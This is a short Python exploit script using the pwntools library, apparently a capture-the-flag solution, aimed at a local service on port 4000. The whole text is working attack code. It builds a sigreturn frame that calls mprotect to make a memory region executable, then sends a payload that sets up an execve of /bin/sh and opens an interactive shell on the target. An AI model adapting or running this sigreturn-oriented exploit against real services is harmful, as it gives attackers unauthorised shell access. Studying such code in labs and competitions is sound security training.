#!/usr/bin/python
from pwn import *

host = 'localhost'
port = 4000

r = remote(host, port)
context.arch='amd64'

read_syscall = 0x400104


bin_sh = 0x400130
sigreturn = SigreturnFrame()
sigreturn.rax = constants.SYS_mprotect
sigreturn.rbp = 0x400000
sigreturn.rsp = bin_sh
sigreturn.rdi = 0x400000
sigreturn.rsi = 0x1000
sigreturn.rdx = 7 # rwx
sigreturn.rip = read_syscall


r.recvuntil('.')
payload = flat([0, 0, 0, 15, 0, 0, 0, 0]) + str(sigreturn)
r.send(payload.ljust(0x200, '\x00'))
r.sendline('/bin/sh\x00' + p64(0)*2 + p64(0x3b) + p64(0)*3 + p64(bin_sh))
r.interactive()
